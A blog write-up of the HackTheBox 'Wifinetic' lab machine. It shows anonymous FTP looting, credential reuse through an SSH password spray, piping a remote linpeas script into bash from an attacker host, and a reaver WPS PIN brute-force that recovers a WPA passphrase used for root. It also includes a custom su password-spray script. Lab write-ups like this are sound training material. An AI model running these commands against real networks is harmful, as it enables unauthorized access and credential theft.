---
title: HTB - Wifinetic
date: 2024-01-10
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, wifinetic, nmap, ftp, wifi, reaver, password-spray]
img_path: /assets/htb/fullpwn/wifinetic/
published: true
image:
    path: room_banner.png
---

## Overview

|:-:|:-:|
|Machine|[Wifinetic](https://app.hackthebox.com/machines/Wifinetic)|
|Rank|Easy|
|Focus|Password spray, WiFi|

## Information gathering

Let's start with an Nmap scan:

```bash
$ sudo nmap -sS -A -Pn --min-rate 10000 -p- wifinetic

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 
53/tcp open  tcpwrapped
```

We get some interesting results back:
- There is an **FTP server** on port `21` with the `anonymous` login option enabled, and we can see that 5 files are there.
- There is an SSH server, but we don't have any credentials to leverage that yet.
- Port `53` is open and listening, but probably firewalled.

> [What `tcpwrapped` means](https://secwiki.org/w/FAQ_tcpwrapped).

Based on the info we have, there is only 1 way forward: exploring the FTP files!

## Initial foothold

We can connect to the FTP server as `anonymous` and use `mget *` to download all files:

> We can also use `wget -r ftp://wifinetic` to download the files without logging into the FTP server.

```bash
# connect the the FTP server as anonymous
$ ftp anonymous@wifinetic
Connected to wifinetic.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
# list directory's files
ftp> ls
229 Entering Extended Passive Mode (|||49649|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
# download all the files
ftp> mget *
mget MigrateOpenWrt.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||45108|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |********************************************************************************************************************************************************************|  4434       37.09 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received in 00:00 (159.37 KiB/s)
mget ProjectGreatMigration.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||49851|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |********************************************************************************************************************************************************************|  2442 KiB    2.48 MiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received in 00:00 (2.41 MiB/s)
mget ProjectOpenWRT.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||41251|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |********************************************************************************************************************************************************************| 60857      908.18 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received in 00:00 (645.76 KiB/s)
mget backup-OpenWrt-2023-07-26.tar [anpqy?]? y
229 Entering Extended Passive Mode (|||47895|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |********************************************************************************************************************************************************************| 40960        1.22 MiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received in 00:00 (646.68 KiB/s)
mget employees_wellness.pdf [anpqy?]? y
229 Entering Extended Passive Mode (|||43899|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |********************************************************************************************************************************************************************| 52946      863.89 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received in 00:00 (583.01 KiB/s)
```

After checking the PDF and TXT files, this is what we have:
- The `ProjectOpenWRT.pdf` file has the name of the Network Admin:

	![](olivia_admin.png){: .normal width="55%"}

- The `employees_wellness.pdf` has the name of the HR Manager:

	![](samantha_hr.png){: .normal width="70%"}

Other than that, nothing really interesting. We can continue by extracting the archive now:

```bash
$ tar -xf backup-OpenWrt-2023-07-26.tar

$ ls -la etc
total 72
drwxr-xr-x 7 kali kali 4096 Sep 11 16:23 .
drwxr-xr-x 3 kali kali 4096 Jan 11 19:27 ..
drwxr-xr-x 2 kali kali 4096 Sep 11 16:22 config
drwxr-xr-x 2 kali kali 4096 Sep 11 16:22 dropbear
-rw-r--r-- 1 kali kali  227 Jul 26 11:08 group
-rw-r--r-- 1 kali kali  110 Apr 27  2023 hosts
-rw-r--r-- 1 kali kali  183 Apr 27  2023 inittab
drwxr-xr-x 2 kali kali 4096 Sep 11 16:22 luci-uploads
drwxr-xr-x 2 kali kali 4096 Sep 11 16:22 nftables.d
drwxr-xr-x 3 kali kali 4096 Sep 11 16:22 opkg
-rw-r--r-- 1 kali kali  420 Jul 26 11:09 passwd
-rw-r--r-- 1 kali kali 1046 Apr 27  2023 profile
-rw-r--r-- 1 kali kali  132 Apr 27  2023 rc.local
-rw-r--r-- 1 kali kali    9 Apr 27  2023 shells
-rw-r--r-- 1 kali kali  475 Apr 27  2023 shinit
-rw-r--r-- 1 kali kali   80 Apr 27  2023 sysctl.conf
-rw-r--r-- 1 kali kali  745 Jul 24 20:15 uhttpd.crt
-rw-r--r-- 1 kali kali  121 Jul 24 20:15 uhttpd.key
```

The archive included a ton of files. After going through everything, we have:
- A list of users provided by the `passwd` file.
- A list of groups within the `group` file.
- An interesting comment at the end of the `profile` file.

```bash
$ cat passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false

$ cat group
root:x:0:
daemon:x:1:
adm:x:4:
mail:x:8:
dialout:x:20:
audio:x:29:
www-data:x:33:
ftp:x:55:
users:x:100:
network:x:101:network
nogroup:x:65534:
ntp:x:123:ntp
dnsmasq:x:453:dnsmasq
logd:x:514:logd
ubus:x:81:ubus
netadmin:!:999:

$ cat profile
<SNIP>
cat << EOF
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
EOF
fi
```

Based on the SSH comment above, we can try logging into SSH as `root` with no password, but that does not work! After searching some more, we find a file that includes a plaintext password:

```bash
$ cat wireless

<SNIP>

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
```

Since we have now a password, we can try to create a list of users based on the `passwd` file, and then try performing a **password-spray attack**:

```bash
# separate the lines using ':' as a delimiter, keep the first field, and write the results on a file
$ cat passwd | cut -d : -f 1 > userList
# display file's content
$ cat userList
root
daemon
ftp
network
nobody
ntp
dnsmasq
logd
ubus
netadmin

# perform a password-spary attack using CME
$ crackmapexec ssh wifinetic -u userList -p 'VeRyUniUqWiFIPasswrd1!'
SSH         wifinetic       22     wifinetic        [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         wifinetic       22     wifinetic        [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] daemon:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] ftp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] nobody:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] dnsmasq:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] logd:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [-] ubus:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         wifinetic       22     wifinetic        [+] netadmin:VeRyUniUqWiFIPasswrd1!
```

Bingo! We can now log into SSH using `netadmin:VeRyUniUqWiFIPasswrd1!`:

```bash
# connect to the SSH server
$ ssh netadmin@wifinetic
# get the user flag!
netadmin@wifinetic:~$ cat user.txt
<SNIP>
```

## Privilege escalation

After searching for SUID files, reading multiple config files, etc. we can't find anything helpful. Since the box is name **Wifinetic**, let's check its network settings:

```bash
netadmin@wifinetic:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:4f8e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:4f8e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:4f:8e  txqueuelen 1000  (Ethernet)
        RX packets 78214  bytes 5539342 (5.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 80264  bytes 10967443 (10.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13858  bytes 831612 (831.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13858  bytes 831612 (831.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 57391  bytes 10171970 (10.1 MB)
        RX errors 0  dropped 57391  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 1087  bytes 116810 (116.8 KB)
        RX errors 0  dropped 271  overruns 0  frame 0
        TX packets 1414  bytes 181792 (181.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 588  bytes 81532 (81.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1087  bytes 136376 (136.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

There are multiple network interfaces which could mean something. Since we don't see any direct privelege escalation path, we can try getting some help by running the [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script on the target:

```bash
# launch a python server from the directory where linpeas.sh is located
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

We can now execute the script directly from the target without actually transferring the file:

```bash
# execute linpeas.sh from target
netadmin@wifinetic:~$ curl http://10.10.14.15:8888/linpeas.sh | bash

<SNIP>

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

<SNIP>

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep

<SNIP>
```

We have used **capabilities** for privilege escalation [before](https://cspanias.github.io/posts/THM-Kiba/#32-capabilities), so let's try to replicate this here:

>  Linux divides the privileges traditionally associated with superuser into distinct units, known as [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), which can be independently enabled and disabled. Capabilities are a per-thread attribute. In brief, capabilities provide granular control of the root’s permissions. 

```bash
# search for files with capabilities
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

Sadly, this time none of the files above is listed on the [GTFOBins](https://gtfobins.github.io/) website. However, the `reaver` tool kind of stands out from the above list. [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is an open-source command-line tool used for performing **brute-force attacks against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases**.

The `cap_net_raw+ep` capability is set for a WiFi attacking tool on a machine called Wifinetic...I think we onto something!

> More on [Linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities).

For performing the attack with `reaver` we need to know the **monitoring interface** and the **Basic Service Set Identifier (BSSID)** of the target.

```bash
netadmin@wifinetic:~$ reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
        -i, --interface=<wlan>          Name of the monitor-mode interface to use
        -b, --bssid=<mac>               BSSID of the target AP
```

We already know the monitoring interface from the `ifconfig` command's output before:

```bash
netadmin@wifinetic:/$ ifconfig

<SNIP>

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 57391  bytes 10171970 (10.1 MB)
        RX errors 0  dropped 57391  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

<SNIP>
```

So all we have to do, is to scan for Wi-Fi networks and find the BSSID:

```bash
# scan for wifi networks
netadmin@wifinetic:~$ iwlist scan
mon0      No scan results

wlan2     No scan results

lo        Interface doesn't support scanning.

wlan1     Scan completed :
          Cell 01 - Address: 02:00:00:00:00:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"OpenWrt"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00060eb1b696f107
                    Extra: Last beacon: 20ms ago
                    IE: Unknown: 00074F70656E577274
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010362DB47BA53A519188FB5458B986B2E41021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120

eth0      Interface doesn't support scanning.

hwsim0    Interface doesn't support scanning.

wlan0     No scan results
```

We can see the BSSID number on the `wlan1` interface with the value of `02:00:00:00:00:00`. We are now ready to attack WPS with `reaver`:

```bash
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[!] Found packet with bad FCS, skipping...
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
```

We managed to recover the WiFi passphrase (`WPA PSK`). Let's quickly check if this is also the password for `root`:

```bash
netadmin@wifinetic:~$ su -
Password:
root@wifinetic:~# cat /root/root.txt
<SNIP>
```

![](machine_pwned.png){: width="65%" .normal}

## Extra

> IppSec's [HackTheBox - Wifinetic](https://youtu.be/jj4r5lwnCp8?t=938).

Check target machine's users:

```bash
# filter the lines that end in 'sh'
netadmin@wifinetic:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
netadmin:x:1000:1000::/home/netadmin:/bin/bash
sjohnson88:x:1001:1001:Network Engineer:/home/sjohnson88:/bin/bash
janderson42:x:1002:1002:Wireless Solutions Specialist:/home/janderson42:/bin/bash
eroberts25:x:1003:1003:Network Operations Manager:/home/eroberts25:/bin/bash
mhughes12:x:1004:1004:WiFi Security Analyst:/home/mhughes12:/bin/bash
jletap77:x:1005:1005:Customer Support Technician:/home/jletap77:/bin/bash
bwhite3:x:1006:1006:Network Architect:/home/bwhite3:/bin/bash
lturner56:x:1007:1007:WiFi Marketing Manager:/home/lturner56:/bin/bash
tcarter90:x:1008:1008:Technical Support Specialist:/home/tcarter90:/bin/bash
owalker17:x:1009:1009:Wireless Network Administrator:/home/owalker17:/bin/bash
dmorgan99:x:1010:1010:WiFi Project Coordinator:/home/dmorgan99:/bin/bash
kgarcia22:x:1011:1011:Network Technician:/home/kgarcia22:/bin/bash
mrobinson78:x:1012:1012:WiFi Deployment Specialist:/home/mrobinson78:/bin/bash
jallen10:x:1013:1013:Wireless Network Engineer:/home/jallen10:/bin/bash
pharris47:x:1014:1014:WiFi Solutions Architect:/home/pharris47:/bin/bash
ayoung33:x:1015:1015:Network Security Analyst:/home/ayoung33:/bin/bash
tclark84:x:1016:1016:Wireless Support Specialist:/home/tclark84:/bin/bash
nlee61:x:1017:1017:WiFi Sales Representative:/home/nlee61:/bin/bash
dwright27:x:1018:1018:Network Operations Coordinator:/home/dwright27:/bin/bash
swood93:x:1019:1019:HR Manager:/home/swood93:/bin/bash
rturner45:x:1020:1020:Wireless Solutions Consultant:/home/rturner45:/bin/bash
mickhat:x:1021:1021:CEO:/home/mickhat:/bin/bash
```

We can create a Bash script to perform a password-spray attack again:

```bash
# filter lines which the lines almost equals to 'sh'
netadmin@wifinetic:~$ awk '$NF ~ /sh$/' /etc/passwd
root:x:0:0:root:/root:/bin/bash
netadmin:x:1000:1000::/home/netadmin:/bin/bash
sjohnson88:x:1001:1001:Network Engineer:/home/sjohnson88:/bin/bash
janderson42:x:1002:1002:Wireless Solutions Specialist:/home/janderson42:/bin/bash
eroberts25:x:1003:1003:Network Operations Manager:/home/eroberts25:/bin/bash
mhughes12:x:1004:1004:WiFi Security Analyst:/home/mhughes12:/bin/bash
jletap77:x:1005:1005:Customer Support Technician:/home/jletap77:/bin/bash
bwhite3:x:1006:1006:Network Architect:/home/bwhite3:/bin/bash
lturner56:x:1007:1007:WiFi Marketing Manager:/home/lturner56:/bin/bash
tcarter90:x:1008:1008:Technical Support Specialist:/home/tcarter90:/bin/bash
owalker17:x:1009:1009:Wireless Network Administrator:/home/owalker17:/bin/bash
dmorgan99:x:1010:1010:WiFi Project Coordinator:/home/dmorgan99:/bin/bash
kgarcia22:x:1011:1011:Network Technician:/home/kgarcia22:/bin/bash
mrobinson78:x:1012:1012:WiFi Deployment Specialist:/home/mrobinson78:/bin/bash
jallen10:x:1013:1013:Wireless Network Engineer:/home/jallen10:/bin/bash
pharris47:x:1014:1014:WiFi Solutions Architect:/home/pharris47:/bin/bash
ayoung33:x:1015:1015:Network Security Analyst:/home/ayoung33:/bin/bash
tclark84:x:1016:1016:Wireless Support Specialist:/home/tclark84:/bin/bash
nlee61:x:1017:1017:WiFi Sales Representative:/home/nlee61:/bin/bash
dwright27:x:1018:1018:Network Operations Coordinator:/home/dwright27:/bin/bash
swood93:x:1019:1019:HR Manager:/home/swood93:/bin/bash
rturner45:x:1020:1020:Wireless Solutions Consultant:/home/rturner45:/bin/bash
mickhat:x:1021:1021:CEO:/home/mickhat:/bin/bash
```

Now we want to get just the first field:

```bash
netadmin@wifinetic:~$ awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd
root
netadmin
sjohnson88
janderson42
eroberts25
mhughes12
jletap77
bwhite3
lturner56
tcarter90
owalker17
dmorgan99
kgarcia22
mrobinson78
jallen10
pharris47
ayoung33
tclark84
nlee61
dwright27
swood93
rturner45
mickhat
```

We can now create our password-spay script:

```bash
$ cat spray.sh
# make a user list from /etc/passwd file
users=$(awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd)


for user in $users 
do
  # pass one argv, timeout for 2 seconds, then switch to that user
  # and print the command
  echo  "$1" | timeout 2 su $user -c whoami 2>/dev/null
done

# execute the script
netadmin@wifinetic:~$ bash spray.sh "WhatIsRealAnDWhAtIsNot51121!"
root
```